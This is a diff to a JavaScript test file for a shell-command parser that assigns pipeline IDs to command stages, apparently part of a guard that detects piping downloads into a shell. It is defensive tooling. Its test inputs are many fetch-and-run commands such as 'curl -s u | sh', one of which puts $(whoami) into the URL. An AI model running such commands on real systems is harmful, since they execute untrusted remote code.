@@ -537,7 +537,8 @@ test('pipeline IDs group stages across simple, multiline, subshell, and |& pipes
       set -u
       . "$DHPK_CI_LIB"
       dhpk_inspect_command "$DHPK_CI_CMD" /session
-      printf 'pipes=%s\\nwords=%s\\n' "\${DHPK_CMD_PIPE_ID[*]}" "\${DHPK_WORDS[*]}"
+      printf 'starts=%s\\npipesLen=%s\\npipes=%s\\nwords=%s\\n' \
+        "\${#DHPK_CMD_START[@]}" "\${#DHPK_CMD_PIPE_ID[@]}" "\${DHPK_CMD_PIPE_ID[*]}" "\${DHPK_WORDS[*]}"
     `], {
       encoding: 'utf8',
       env: { ...process.env, DHPK_CI_LIB: LIB, DHPK_CI_CMD: command },
@@ -548,6 +549,7 @@ test('pipeline IDs group stages across simple, multiline, subshell, and |& pipes
       const eq = line.indexOf('=');
       if (eq !== -1) out[line.slice(0, eq)] = line.slice(eq + 1);
     }
+    assert.strictEqual(out.pipesLen, out.starts, `${command}: PIPE_ID length mismatch (${out.pipesLen} vs ${out.starts})`);
     return out;
   };
   assert.strictEqual(runPipeCheck('curl -s u | tee x | sh').pipes, '1 1 1');
@@ -556,6 +558,27 @@ test('pipeline IDs group stages across simple, multiline, subshell, and |& pipes
   assert.strictEqual(runPipeCheck('(curl -s u) | sh').pipes, '1 1');
   assert.strictEqual(runPipeCheck('curl -s u; sh').pipes, '0 0');
   assert.strictEqual(runPipeCheck('curl -s "$(echo a | cat)" | sh').pipes, '1 1 2 2');
+
+  // Single-word $(cmd) fast path must keep DHPK_CMD_PIPE_ID aligned with DHPK_CMD_START.
+  assert.strictEqual(runPipeCheck('curl -s https://example.test/$(whoami) | sh').pipes, '0 1 1');
+  assert.strictEqual(runPipeCheck('echo $(whoami) && curl -s https://example.test | sh').pipes, '0 0 1 1');
+
+  // Compound groups on LHS and RHS of pipelines share non-zero pipeline IDs,
+  // while commands after a closed group pipeline revert to 0.
+  assert.strictEqual(runPipeCheck('{ curl -s u; } | sh').pipes, '1 1 1');
+  assert.strictEqual(runPipeCheck('if true; then curl -s u; fi | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('for i in 1; do curl -s u; done | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('while true; do curl -s u; done | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('case x in x) curl -s u;; esac | sh').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('(curl -s u | cat) | sh').pipes, '2 2 2');
+  assert.strictEqual(runPipeCheck('echo a | (curl -s u) | sh').pipes, '1 1 1');
+  assert.strictEqual(runPipeCheck('curl -s u | (true; sh)').pipes, '1 1 1');
+  assert.strictEqual(runPipeCheck('curl -s u | {\nsh\n}').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('curl -s u | (true && cat | sh)').pipes, '1 1 1 1');
+  assert.strictEqual(runPipeCheck('(curl -s u) | (cat); sh').pipes, '1 1 0');
+  assert.strictEqual(runPipeCheck('(curl -s u) | (cat)\nsh').pipes, '1 1 0');
+  assert.strictEqual(runPipeCheck('curl -s u | {\ncat\n}\nsh').pipes, '1 1 1 1 0');
+  assert.strictEqual(runPipeCheck('if curl -s u | grep -q ok; then sh; fi').pipes, '1 1 0 0');
 });
 
 test('cache export/load reuses parsed state safely and rejects mismatches or tampering (#1409)', () => {
